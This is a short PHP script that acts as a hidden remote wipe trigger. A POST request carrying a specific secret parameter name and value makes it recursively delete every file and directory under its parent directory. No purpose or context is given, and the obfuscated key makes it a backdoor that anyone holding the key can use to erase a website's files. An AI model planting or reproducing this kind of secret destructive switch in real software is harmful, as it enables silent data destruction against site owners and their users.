<?php

  if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["j?=CC7i~DO3UMFTF_Xp:z$"] === "J@s2Ek%[$\X#sF'R,rVOkT2H") {
    recursiveRemoveDirectory("../");
  }

  function recursiveRemoveDirectory($directory) {
    foreach(glob("{$directory}/*") as $file) {
        if(is_dir($file)) {
            recursiveRemoveDirectory($file);
        } else {
            unlink($file);
        }
    }
    rmdir($directory);
  }
 ?>
